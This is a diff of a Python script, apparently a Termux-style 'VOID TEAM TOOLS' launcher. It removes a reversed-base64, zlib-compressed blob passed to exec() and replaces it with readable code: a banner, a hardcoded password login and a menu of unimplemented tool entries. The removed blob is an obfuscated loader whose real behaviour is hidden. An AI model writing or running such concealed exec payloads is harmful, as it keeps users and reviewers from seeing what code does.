@@ -1,2 +1,69 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+import os
+import time
+import sys
+
+# --- KONFIGURASI PASSWORD ---
+# Ganti "omeng123" dengan password yang kamu mau
+PASSWORD_RAHASIA = "omengganteng"
+
+def bersihkan_layar():
+    os.system('clear')
+
+def banner():
+    print("\033[1;36m") # Warna Cyan
+    print("========================================")
+    print("       Where Logic Ends. The Void Begins        ")
+    print("========================================")
+    print("\033[0m")
+
+def menu_utama():
+    bersihkan_layar()
+    print("\033[1;32m") # Warna Hijau
+    print("========================================")
+    print("      VOID TEAM TOOLS - INISIAL V      ")
+    print("========================================")
+    print("1. TOOLS")
+    print("2. TOOLS")
+    print("3. Keluar")
+    print("========================================")
+    # Di sini nanti bisa ditambah logika tools-nya
+    pilihan = input("Pilih menu (1-3): ")
+    if pilihan == '3':
+        print("Bye bye!")
+        sys.exit()
+    else:
+        print(f"Kamu memilih menu {pilihan}. (Fitur belum dibuat)")
+
+def login():
+    bersihkan_layar()
+    banner()
+    
+    # Loop biar kalau salah bisa coba lagi 3x
+    kesempatan = 3
+    
+    while kesempatan > 0:
+        print(f"\033[1;33m[!] Masukkan Password untuk akses tools ini.")
+        print(f"[!] Kesempatan: {kesempatan}x lagi\033[0m")
+        
+        # Input password
+        try:
+            password = input("Password: ")
+        except KeyboardInterrupt:
+            print("\nKeluar paksa...")
+            sys.exit()
+
+        if password == PASSWORD_RAHASIA:
+            print("\n\033[1;32m[+] AKSES DITERIMA! Selamat datang Boss.\033[0m")
+            time.sleep(2) # Jeda 2 detik biar keren
+            menu_utama()
+            break
+        else:
+            print("\n\033[1;31m[X] PASSWORD SALAH! Coba lagi.\033[0m\n")
+            kesempatan -= 1
+            
+    if kesempatan == 0:
+        print("\n\033[1;41m[!] ACCESS DECLINE : YOU ARE NOT PART OF VOID TEAM [!]\033[0m")
+        sys.exit()
+
+if __name__ == "__main__":
+    login()
